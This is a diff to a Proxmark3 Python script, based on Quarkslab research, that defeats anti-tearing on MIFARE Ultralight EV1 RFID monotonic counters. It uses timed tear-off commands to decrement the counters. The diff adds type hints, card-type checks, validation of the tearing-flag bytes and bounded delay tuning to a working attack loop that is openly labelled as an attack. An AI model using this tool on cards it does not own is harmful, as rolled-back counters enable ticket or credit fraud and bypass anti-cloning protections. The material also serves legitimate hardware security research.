@@ -7,10 +7,15 @@
 # the Free Software Foundation, either version 3 of the License, or
 # (at your option) any later version.
 #
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
 # See LICENSE.txt for the text of the license.
 #-----------------------------------------------------------------------------
 # Bypass Anti-Tearing on MIFARE Ultralight EV1 monotonic counters (tear-off).
-# Script version: 2.0.0
+# Script version: 2.2.0
 # Created by W0rthlessS0ul (https://github.com/W0rthlessS0ul)
 # Based on Quarkslab research: https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html
 # Updated by M35MAR (https://github.com/M35mar)
@@ -22,6 +27,7 @@ import re
 import sys
 import threading
 import time
+from typing import Tuple, Optional
 
 import pm3
 
@@ -54,6 +60,8 @@ TEAR_REPAIR_ATTEMPTS = 5
 ANSI_ESCAPE = re.compile(r"\x1b\[[0-9;]*m")
 PM3_PAYLOAD_RE = re.compile(r"\[\+\]\s+([^\n\[]+)")
 NACK_BYTES = frozenset({"04", "05", "06", "0A", "0a"})
+# CHECK_TEARING_EVENT only ever answers 0x00 (no tear) or 0xBD (tear detected).
+VALID_TEARING_BYTES = frozenset({"00", "BD"})
 
 p = pm3.pm3()
 
@@ -72,7 +80,9 @@ def build_parser():
             )
         ),
     )
-    parser.add_argument("-c", "--cnt", metavar="", default="0", help="Counter index (0-2)")
+    parser.add_argument(
+        "-c", "--cnt", metavar="", choices=["0", "1", "2"], default="0", help="Counter index (0-2)"
+    )
     parser.add_argument("-f", "--force", action="store_true", help="Skip pre-flight checks")
     parser.add_argument("--DelayBD", metavar="", type=int, help="Manual BD delay (us, disables auto-calibration)")
     parser.add_argument("--Delay00", metavar="", type=int, help="Manual 00 delay (us)")
@@ -125,7 +135,7 @@ def wake_card() -> None:
     run_pm3("hf 14a reader")
 
 
-def parse_counter_output(output: str):
+def parse_counter_output(output: str) -> Tuple[Optional[str], Optional[int]]:
     payload = extract_pm3_payload(output)
     if not payload:
         return None, None
@@ -149,16 +159,23 @@ def parse_counter_output(output: str):
     return format_counter_hex(counter_int), counter_int
 
 
-def parse_tearing_output(output: str):
+def parse_tearing_output(output: str) -> Tuple[Optional[bool], str]:
+    """Return (torn, raw) or (None, raw) when the reply is not a valid tearing byte.
+
+    A single NACK byte (e.g. 0A) is reported as (None, "0A") so the caller can retry
+    instead of mistaking it for a real "00"/"BD" answer.
+    """
     payload = extract_pm3_payload(output)
     if not payload:
-        return False, "?"
+        return None, "?"
 
     tearing = payload.split()[0].upper()
+    if tearing not in VALID_TEARING_BYTES:
+        return None, tearing
     return tearing == "BD", tearing
 
 
-def read_counter(counter_index: str):
+def read_counter(counter_index: str) -> Tuple[Optional[str], Optional[int]]:
     for _ in range(RETRY_COUNT):
         output = run_pm3(f"hf 14a raw -s -c 39 0{counter_index}")
         counter_hex, counter_int = parse_counter_output(output)
@@ -169,13 +186,13 @@ def read_counter(counter_index: str):
     return None, None
 
 
-def check_tearing_event(counter_index: str):
+def check_tearing_event(counter_index: str) -> Tuple[bool, str]:
     for _ in range(RETRY_COUNT):
         output = run_pm3(f"hf 14a raw -s -c 3E 0{counter_index}")
-        try:
-            return parse_tearing_output(output)
-        except (IndexError, ValueError):
-            time.sleep(RETRY_SLEEP_S)
+        tearing_ok, tearing = parse_tearing_output(output)
+        if tearing_ok is not None:
+            return tearing_ok, tearing
+        time.sleep(RETRY_SLEEP_S)
     return False, "?"
 
 
@@ -197,7 +214,7 @@ def repair_tear_flag(counter_index: str) -> bool:
     wake_card()
     for _ in range(TEAR_REPAIR_ATTEMPTS):
         _, tearing = check_tearing_event(counter_index)
-        if tearing in ("00", "BD"):
+        if tearing in VALID_TEARING_BYTES:
             return True
         incr_cnt(counter_index, "000000")
         incr_cnt(counter_index, "000000")
@@ -209,12 +226,12 @@ def repair_tear_flag(counter_index: str) -> bool:
     time.sleep(RETRY_SLEEP_S)
     wake_card()
     _, tearing = check_tearing_event(counter_index)
-    return tearing in ("00", "BD")
+    return tearing in VALID_TEARING_BYTES
 
 
 def normalize_tear_flag(counter_index: str) -> None:
     for _ in range(TEAR_REPAIR_ATTEMPTS * 2):
-        if check_tearing_event(counter_index)[1] in ("00", "BD"):
+        if check_tearing_event(counter_index)[1] in VALID_TEARING_BYTES:
             return
         incr_cnt(counter_index, "000000")
 
@@ -240,10 +257,21 @@ def run_reset_step(counter_index: str, delay_bd: int, delay_00: int) -> None:
 
 
 def tune_delay(delay_bd: int, previous_counter: int, current_counter: int, locked: bool) -> int:
+    """Tune BD delay based on counter changes.
+    
+    Args:
+        delay_bd: Current BD delay in microseconds
+        previous_counter: Previous counter value for comparison
+        current_counter: Current counter value
+        locked: If True, delay is locked and not adjusted
+        
+    Returns:
+        Adjusted delay_bd value
+    """
     if locked:
         return delay_bd
     if current_counter == previous_counter:
-        return delay_bd + DELAY_TUNE_STEP
+        return min(DELAY_BD_MAX, delay_bd + DELAY_TUNE_STEP)
     if current_counter - previous_counter > DELAY_TUNE_JUMP:
         return max(DELAY_BD_MIN, delay_bd - DELAY_TUNE_STEP)
     return delay_bd
@@ -254,8 +282,20 @@ def is_ev1_card() -> bool:
     output = run_pm3("hf 14a raw -s -c 60")
     payload = extract_pm3_payload(output)
     parts = payload.split()
-    if len(parts) >= 5 and parts[4].upper() == "01":
-        return True
+
+    # GET_VERSION layout: [0]=?, [1]=vendor, [2]=product type, [3]=subtype,
+    # [4]=major version, [5]=minor version, [6]=size, [7]=protocol type.
+    # MIFARE Ultralight EV1 -> product type 0x03, major version 0x01.
+    # NTAG also reports major 0x01, so the product type must be checked too.
+    if len(parts) >= 5:
+        try:
+            product_type = int(parts[2], 16)
+            major_version = int(parts[4], 16)
+        except (ValueError, IndexError):
+            pass
+        else:
+            if product_type == 0x03 and major_version == 0x01:
+                return True
 
     info_output = run_pm3("hf mfu info").lower()
     return any(
@@ -264,8 +304,6 @@ def is_ev1_card() -> bool:
             "ul ev1",
             "ultralight ev1",
             "ul-ev1",
-            "major version: 01",
-            "mfu ev1",
         )
     )
 
@@ -282,7 +320,7 @@ def preflight_checks(counter_index: str) -> bool:
         return False
 
     _, tearing = check_tearing_event(counter_index)
-    if tearing not in ("00", "BD"):
+    if tearing not in VALID_TEARING_BYTES:
         print(f"[{color('!', 'red')}] Card does not support CHECK_TEARING_EVENT")
         return False
 
@@ -335,8 +373,13 @@ class StopListener:
                 self._stop = True
 
 
-def calibrate_bd_delay(counter_index: str, stop: StopListener):
-    """Return (delay_bd, delay_00) where delay_00 = delay_bd - 15 (fixed offset)."""
+def calibrate_bd_delay(counter_index: str, stop: StopListener) -> Tuple[Optional[int], Optional[int]]:
+    """Auto-calibrate BD delay for tear-off.
+    
+    Returns:
+        Tuple of (delay_bd, delay_00) where delay_00 is calculated as delay_bd - DELAY_00_OFFSET,
+        or (None, None) if calibration failed.
+    """
     best_bd = None
 
     for delay_bd in range(DELAY_BD_MIN, DELAY_BD_MAX, CAL_STEP_US):
@@ -453,16 +496,13 @@ def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopList
                     f"\n[{color('+', 'green')}] Decrement! {initial_hex.upper()} -> "
                     f"{final_hex.upper()} (delta {initial_int - final_int})"
                 )
-                # Consolidate the drop
-                incr_cnt(counter_index, "000000")
-                time.sleep(0.2)
-                incr_cnt(counter_index, "000000")
+                # Consolidate the drop by normalizing tear flag
                 normalize_tear_flag(counter_index)
                 delay_locked = True
                 tune_reference = final_int
                 continue
 
-            # Tuning logic
+            # Tuning logic for delay adjustment
             if final_int > initial_int:
                 if delay_locked:
                     delay_locked = False
@@ -471,7 +511,7 @@ def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopList
                     new_delay = tune_delay(delay_bd, tune_reference, final_int, False)
                     if new_delay != delay_bd:
                         delay_bd = new_delay
-                        # delay_00 is intentionally left unchanged
+                        # delay_00 is intentionally not changed; only BD is adjusted during tuning
                     tune_reference = final_int
             else:
                 if not delay_locked:
@@ -543,7 +583,10 @@ def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopList
                     delay_bd = new_delay
                 reset_reference = final_int
             elif final_int < initial_int:
-                print(f"\n[{color('+', 'green')}] Reset decrement! {initial_hex} -> {final_hex}")
+                print(
+                    f"\n[{color('+', 'green')}] Reset decrement! {initial_hex.upper()} -> "
+                    f"{final_hex.upper()} (delta {initial_int - final_int})"
+                )
                 delay_locked = True
                 reset_reference = final_int
             # else final_int slightly higher but still within range – ignore
@@ -551,7 +594,7 @@ def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopList
     return False
 
 
-def main():
+def main(args) -> int:
     print(color("Attack against the monotonic counters of MFU EV1 using the tear-off technique.", "cyan"))
     print(
         color(
@@ -571,13 +614,15 @@ def main():
     stop = StopListener()
     stop.start()
 
-    success = False
     try:
         if args.DelayBD is None:
             result = calibrate_bd_delay(args.cnt, stop)
             if result[0] is None:
                 return 1
             delay_bd, delay_00 = result
+            if args.Delay00 is not None:
+                delay_00 = args.Delay00
+                print(f"[{color('+', 'green')}] Using manual 00 delay: {color(delay_00, 'green')} us")
         else:
             delay_bd = args.DelayBD
             delay_00 = args.Delay00 if args.Delay00 is not None else delay_bd - DELAY_00_OFFSET
@@ -589,8 +634,7 @@ def main():
             print("\n[x] Interrupted by user.")
             return 0
 
-        success = attack_loop(args.cnt, delay_bd, delay_00, stop)
-        if success:
+        if attack_loop(args.cnt, delay_bd, delay_00, stop):
             return 0
         if stop.stopped:
             print("\n[x] Interrupted by user.")
@@ -611,7 +655,7 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     try:
-        sys.exit(main())
+        sys.exit(main(args))
     except KeyboardInterrupt:
         disable_tearoff()
         print("\n[x] Interrupted.")
